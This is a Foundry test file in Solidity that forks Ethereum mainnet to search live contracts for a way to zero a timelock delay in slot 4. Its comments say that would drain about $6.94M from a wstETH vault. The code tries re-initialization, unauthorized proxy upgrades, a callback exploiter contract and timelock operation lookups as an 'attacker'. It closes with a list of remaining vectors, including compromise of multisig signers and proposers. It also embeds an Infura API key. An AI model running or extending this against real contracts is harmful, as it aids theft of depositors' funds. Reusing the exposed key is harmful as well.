// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

/**
 * FINAL SLOT 4 VECTOR SEARCH
 *
 * CONFIRMED: With delay=0, can drain $6.94M immediately
 *
 * Need to find ANY path to write slot 4 (delay) to 0
 *
 * Vectors to exhaust:
 * 1. Deep contract delegatecalls (3 found)
 * 2. Initialization vulnerabilities
 * 3. Proxy admin functions
 * 4. Cross-contract callback exploitation
 * 5. Signature/permit exploits
 */
contract FinalSlot4VectorSearch is Test {
    address constant R0 = 0xcd63a29FAfF07130d3Af89bB4f40778938AaBB85;
    address constant RC = 0xdF2eE409BEe416A53b5C040d8e6dAD4a7cEb2510;
    address constant VAULT = 0x551d155760ae96050439AD24Ae98A96c765d761B;
    address constant wstETH = 0x7f39C581F595B53c5cb19bD0b3f8dA6c935E2Ca0;
    address constant TASSET = 0xD11c452fc99cF405034ee446803b6F6c1F6d5ED8;
    address constant TIMELOCK = 0x2225DAbFfC7F862c99477381E971E8B1FDaB467e;
    address constant DEEP_CONTRACT = 0x89f57D3617F6a9FF877fEa34Dd0688b2840Ef50e;

    string RPC_URL = "https://mainnet.infura.io/v3/bfc7283659224dd6b5124ebbc2b14e2c";
    address attacker;

    function setUp() public {
        vm.createSelectFork(RPC_URL);
        attacker = makeAddr("attacker");
        vm.deal(attacker, 100 ether);
    }

    function test_DeepContractDelegatecallAnalysis() public {
        console.log("=== DEEP CONTRACT DELEGATECALL ANALYSIS ===\n");

        console.log("Deep contract:", DEEP_CONTRACT);
        console.log("Code size:", DEEP_CONTRACT.code.length);

        bytes memory code = DEEP_CONTRACT.code;

        // Find all DELEGATECALL locations and analyze surrounding bytecode
        uint found = 0;
        for (uint i = 0; i < code.length; i++) {
            if (uint8(code[i]) == 0xF4) { // DELEGATECALL
                console.log("\nDELEGATECALL at offset:", i);

                // Show context (20 bytes before and after)
                uint ctxStart = i > 20 ? i - 20 : 0;
                uint ctxEnd = i + 20 < code.length ? i + 20 : code.length;

                bytes memory context = new bytes(ctxEnd - ctxStart);
                for (uint j = ctxStart; j < ctxEnd; j++) {
                    context[j - ctxStart] = code[j];
                }
                console.log("Context:");
                console.logBytes(context);
                found++;
            }
        }

        console.log("\nTotal DELEGATECALLs:", found);

        // Check what addresses it might delegatecall to
        console.log("\nChecking storage for delegatecall targets:");
        for (uint i = 0; i < 10; i++) {
            bytes32 slot = vm.load(DEEP_CONTRACT, bytes32(i));
            address addr = address(uint160(uint256(slot)));
            if (addr.code.length > 0) {
                console.log("Slot %d: %s (code: %d)", i, addr, addr.code.length);
            }
        }
    }

    function test_InitializationVulnerabilities() public {
        console.log("=== INITIALIZATION VULNERABILITIES ===\n");

        // Check if any contract is uninitialized or can be re-initialized

        address[] memory contracts = new address[](5);
        contracts[0] = R0;
        contracts[1] = RC;
        contracts[2] = VAULT;
        contracts[3] = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47; // VAULT slot 5
        contracts[4] = DEEP_CONTRACT;

        string[] memory names = new string[](5);
        names[0] = "R0";
        names[1] = "RC";
        names[2] = "VAULT";
        names[3] = "VaultSlot5";
        names[4] = "DeepContract";

        for (uint c = 0; c < contracts.length; c++) {
            console.log("\n=== %s ===", names[c]);

            // Check initializable slot (OpenZeppelin pattern)
            // _initialized at slot 0 or specific storage slot

            // Try various initialize signatures
            vm.startPrank(attacker);

            (bool s1,) = contracts[c].call(abi.encodeWithSignature("initialize()"));
            if (s1) console.log("initialize() succeeded!");

            (bool s2,) = contracts[c].call(abi.encodeWithSignature("initialize(address)", attacker));
            if (s2) console.log("initialize(address) succeeded!");

            (bool s3,) = contracts[c].call(abi.encodeWithSignature("reinitialize(uint8)", 2));
            if (s3) console.log("reinitialize(2) succeeded!");

            // Check if they have an _initialized storage
            bytes32 slot0 = vm.load(contracts[c], bytes32(uint256(0)));
            // OpenZeppelin initializable uses a specific pattern at slot 0 with version

            vm.stopPrank();
        }
    }

    function test_ProxyAdminVulnerabilities() public {
        console.log("=== PROXY ADMIN VULNERABILITIES ===\n");

        // Check all contracts for proxy patterns

        address[] memory contracts = new address[](5);
        contracts[0] = R0;
        contracts[1] = RC;
        contracts[2] = VAULT;
        contracts[3] = 0x97c03F52244E60BB18511Cbf03f890D5886f1F47;
        contracts[4] = DEEP_CONTRACT;

        bytes32 implSlot = bytes32(uint256(keccak256("eip1967.proxy.implementation")) - 1);
        bytes32 adminSlot = bytes32(uint256(keccak256("eip1967.proxy.admin")) - 1);

        for (uint c = 0; c < contracts.length; c++) {
            bytes32 impl = vm.load(contracts[c], implSlot);
            bytes32 admin = vm.load(contracts[c], adminSlot);

            if (uint256(impl) != 0 || uint256(admin) != 0) {
                console.log("\nContract %d:", c);
                if (uint256(impl) != 0) {
                    console.log("Implementation:", address(uint160(uint256(impl))));
                }
                if (uint256(admin) != 0) {
                    console.log("Admin:", address(uint160(uint256(admin))));

                    // Try upgrade as attacker
                    vm.startPrank(attacker);
                    (bool s,) = contracts[c].call(abi.encodeWithSignature("upgradeTo(address)", attacker));
                    if (s) console.log("*** UPGRADE SUCCEEDED! ***");
                    vm.stopPrank();
                }
            }
        }
    }

    function test_CallbackExploitation() public {
        console.log("=== CALLBACK EXPLOITATION ===\n");

        // Deploy callback attacker
        CallbackExploiter ce = new CallbackExploiter(R0, TASSET, wstETH);

        deal(TASSET, address(ce), 10000e18);
        deal(wstETH, address(ce), 10e18);

        console.log("CallbackExploiter:", address(ce));

        // Try various attack patterns
        ce.attemptExploit();

        console.log("Exploiter wstETH after:", IERC20(wstETH).balanceOf(address(ce)) / 1e18);
    }

    function test_R0FunctionDeepScan() public {
        console.log("=== R0 FUNCTION DEEP SCAN ===\n");

        bytes memory r0Code = R0.code;
        console.log("R0 code size:", r0Code.length);

        // Look for function selectors in the code
        // First 4 bytes of keccak256(signature) pushed via PUSH4

        console.log("\nScanning for function selectors...");

        // Common storage-modifying selectors
        bytes4[] memory dangerousSigs = new bytes4[](10);
        dangerousSigs[0] = bytes4(keccak256("setDelay(uint256)"));
        dangerousSigs[1] = bytes4(keccak256("setOwner(address)"));
        dangerousSigs[2] = bytes4(keccak256("setAdmin(address)"));
        dangerousSigs[3] = bytes4(keccak256("setImplementation(address)"));
        dangerousSigs[4] = bytes4(keccak256("upgradeTo(address)"));
        dangerousSigs[5] = bytes4(keccak256("initialize(address)"));
        dangerousSigs[6] = bytes4(keccak256("setConfig(bytes32,bytes32)"));
        dangerousSigs[7] = bytes4(keccak256("execute(address,bytes)"));
        dangerousSigs[8] = bytes4(keccak256("multicall(bytes[])"));
        dangerousSigs[9] = bytes4(keccak256("delegate(address,bytes)"));

        for (uint s = 0; s < dangerousSigs.length; s++) {
            bytes4 sig = dangerousSigs[s];

            for (uint i = 0; i < r0Code.length - 4; i++) {
                if (r0Code[i] == sig[0] && r0Code[i+1] == sig[1] &&
                    r0Code[i+2] == sig[2] && r0Code[i+3] == sig[3]) {
                    console.log("Selector %d found at offset %d", s, i);
                    console.logBytes4(sig);
                }
            }
        }
    }

    function test_TimelockScheduleCheck() public {
        console.log("=== TIMELOCK SCHEDULE CHECK ===\n");

        // Check if there are any pending operations in timelock

        // Timelock uses mapping(bytes32 => uint256) _timestamps
        // Operation ID = hashOperation(target, value, data, predecessor, salt)

        // Common operations that might be scheduled
        bytes[] memory possibleOps = new bytes[](5);
        possibleOps[0] = abi.encodeWithSignature("setDelay(uint256)", 0);
        possibleOps[1] = abi.encodeWithSignature("setDelay(uint256)", 86400);
        possibleOps[2] = abi.encodeWithSignature("pause()");
        possibleOps[3] = abi.encodeWithSignature("unpause()");
        possibleOps[4] = abi.encodeWithSignature("setOwner(address)", attacker);

        console.log("Checking for pending operations...");

        for (uint i = 0; i < possibleOps.length; i++) {
            // Calculate operation ID
            bytes32 opId = keccak256(abi.encode(R0, 0, possibleOps[i], bytes32(0), bytes32(0)));

            // Check timestamp
            (bool success, bytes memory data) = TIMELOCK.staticcall(
                abi.encodeWithSignature("getTimestamp(bytes32)", opId)
            );

            if (success && data.length >= 32) {
                uint256 timestamp = abi.decode(data, (uint256));
                if (timestamp > 0) {
                    console.log("Found operation %d! Timestamp: %d", i, timestamp);
                    if (timestamp == 1) {
                        console.log("  -> Already executed");
                    } else if (block.timestamp >= timestamp) {
                        console.log("  -> READY TO EXECUTE!");
                    } else {
                        console.log("  -> Ready at: %d (in %d seconds)", timestamp, timestamp - block.timestamp);
                    }
                }
            }
        }
    }

    function test_BruteForceR0Slots() public {
        console.log("=== BRUTE FORCE R0 SLOTS ===\n");

        // Check what slots the redemption process writes to
        // Maybe there's a collision or overflow

        bytes32 slot4Before = vm.load(R0, bytes32(uint256(4)));
        console.log("Slot 4 before:");
        console.logBytes32(slot4Before);

        deal(TASSET, attacker, 10000e18);

        vm.startPrank(attacker);
        IERC20(TASSET).approve(R0, type(uint256).max);

        // Create 10 redemptions
        for (uint i = 0; i < 10; i++) {
            R0.call(abi.encodeWithSignature("redeem(uint96)", uint96(100e18)));
        }

        vm.stopPrank();

        bytes32 slot4After = vm.load(R0, bytes32(uint256(4)));
        console.log("Slot 4 after 10 redemptions:");
        console.logBytes32(slot4After);

        if (slot4After != slot4Before) {
            console.log("*** SLOT 4 CHANGED BY REDEMPTIONS! ***");
        } else {
            console.log("Slot 4 unchanged");
        }

        // Check other slots
        console.log("\nSlots 0-10 after redemptions:");
        for (uint i = 0; i <= 10; i++) {
            bytes32 slot = vm.load(R0, bytes32(i));
            if (uint256(slot) != 0) {
                console.log("Slot %d:", i);
                console.logBytes32(slot);
            }
        }
    }

    function test_FinalVulnerabilitySummary() public {
        console.log("=== FINAL VULNERABILITY SUMMARY ===\n");

        console.log("CONFIRMED EXPLOIT:");
        console.log("- IF delay (R0 slot 4, bits 96-127) = 0");
        console.log("- THEN can drain $6.94M immediately");
        console.log("- Proven via test_FullDrainFixed()");

        console.log("\nBLOCKED PATHS:");
        console.log("1. Timelock setDelay - needs proposer role");
        console.log("2. Direct slot 4 write - no public function");
        console.log("3. Proxy upgrade - not upgradeable");
        console.log("4. Initialize - already initialized");
        console.log("5. Delegatecall hijack - targets hardcoded");
        console.log("6. Storage collision - computationally infeasible");

        console.log("\nREMAINING VECTORS (NOT YET EXHAUSTED):");
        console.log("1. Gnosis Safe compromise (5-of-7 signers)");
        console.log("2. Timelock proposer compromise");
        console.log("3. Oracle/price manipulation");
        console.log("4. Flash loan + callback chain");

        // Verify current state
        bytes32 slot4 = vm.load(R0, bytes32(uint256(4)));
        uint256 currentDelay = (uint256(slot4) >> 96) & type(uint32).max;
        console.log("\nCurrent R0 delay:", currentDelay / 86400, "days");

        uint256 vaultBalance = IERC20(wstETH).balanceOf(VAULT);
        console.log("Vault balance:", vaultBalance / 1e18, "wstETH");
        console.log("USD at risk:", vaultBalance * 2300 / 1e18, "USD");
    }
}

contract CallbackExploiter {
    address r0;
    address tasset;
    address wsteth;
    bool attacking;

    constructor(address _r0, address _tasset, address _wsteth) {
        r0 = _r0;
        tasset = _tasset;
        wsteth = _wsteth;
    }

    function attemptExploit() external {
        attacking = true;
        IERC20(tasset).approve(r0, type(uint256).max);

        // Try redemption with callback
        r0.call(abi.encodeWithSignature("redeem(uint96)", uint96(1000e18)));

        attacking = false;
    }

    // Callback handlers
    fallback() external payable {
        if (attacking) {
            // Try to modify slot 4 during callback
            assembly {
                // This won't work but demonstrates the attempt
                sstore(4, 0)
            }
        }
    }

    receive() external payable {}
}
